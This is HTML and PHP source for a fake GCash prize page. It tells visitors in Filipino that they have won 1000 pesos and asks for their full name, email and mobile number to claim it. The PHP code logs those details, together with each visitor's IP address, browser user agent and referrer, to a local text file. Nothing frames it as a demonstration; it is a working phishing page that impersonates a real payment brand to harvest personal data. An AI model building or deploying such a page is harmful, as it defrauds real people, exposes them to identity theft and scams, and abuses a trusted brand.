<!DOCTYPE html>
<html lang="en">
<link rel="icon" type="image/png" href="gcashlogo.png">
<style>
body {
  background-image: url('gcashbg.png');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
}
/* Apply Gotham Rounded to the entire page */
body {
            font-family: 'Gotham Rounded', Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }

        h1 {
            font-size: 2.5rem;
            color: #333;
            margin-bottom: 10px;
        }

        h2 {
            font-size: 1.5rem;
            color: #333;
            margin-bottom: 20px;
        }

        form {
            display: inline-block;
            text-align: left;
            background-color: #fff;
            padding: 30px;
            padding-right: 50px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        label {
            font-size: 1rem;
            color: #333;
        }

        input[type="text"],
        input[type="email"],
        input[type="tel"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0 16px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
        }

        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }
</style>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gcash Winner</title>
    <script>
        // Function to set a cookie (with user consent)
        function setCookie(name, value, days) {
            const date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            const expires = "expires=" + date.toUTCString();
            document.cookie = name + "=" + value + ";" + expires + ";path=/";
        }

        // Function to get a cookie
        function getCookie(name) {
            const cookieName = name + "=";
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i].trim();
                if (cookie.indexOf(cookieName) === 0) {
                    return cookie.substring(cookieName.length, cookie.length);
                }
            }
            return "";
        }

        // Set a cookie if the user consents
        if (confirm("This website uses cookies to enhance your experience. Do you agree?")) {
            setCookie("userConsent", "true", 30); // Set a cookie for 30 days
        }
    </script>
</head>
<body><center><br><br>
<img src="gcashlogo.png" style="float:left;width:100px;height:100px;">
    <h1>Nanalo ka ng 1000 pesos sa GCASH</h1>
    <h2>fill up below to claim</h2>
    <form action="index.php" method="POST">
    <label for="firstname">First Name:</label>
        <input type="text" id="firstname" name="firstname" required><br><br>
        <label for="middlename">Middle Name:</label>
        <input type="text" id="middlename" name="middlename" required><br><br>
        <label for="lastname">Last Name:</label>
        <input type="text" id="lastname" name="lastname" required><br><br>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br><br>
        <label for="mobile">Mobile Number:</label>
        <input type="tel" id="mobile" name="mobile" pattern="[0-9]{12}" required><br><br>
        <button type="submit">Submit</button>
    </form>
    </center>
</body>
</html>

<?php
// Function to get the user's exact IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // IP from shared internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // IP passed from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        // Default remote address
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Get user information
$ip = getUserIP(); // Use the function to get the exact IP
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$referrer = $_SERVER['HTTP_REFERER'] ?? "No referrer";
$dateTime = date("Y-m-d H:i:s");

// Get form data (if submitted)
$firstname = $_POST['firstname'] ?? "Not provided";
$middlename = $_POST['middlename'] ?? "Not provided";
$lastname = $_POST['lastname'] ?? "Not provided";
$email = $_POST['email'] ?? "Not provided";
$mobile = $_POST['mobile'] ?? "Not provided";

// Log the information to a file
$logEntry = "IP: $ip | User Agent: $userAgent | Referrer: $referrer | First Name: $firstname | Middle Name: $middlename | Last Name: $lastname | Email: $email | Mobile: $mobile | Date/Time: $dateTime\n";
file_put_contents("user_log.txt", $logEntry, FILE_APPEND);
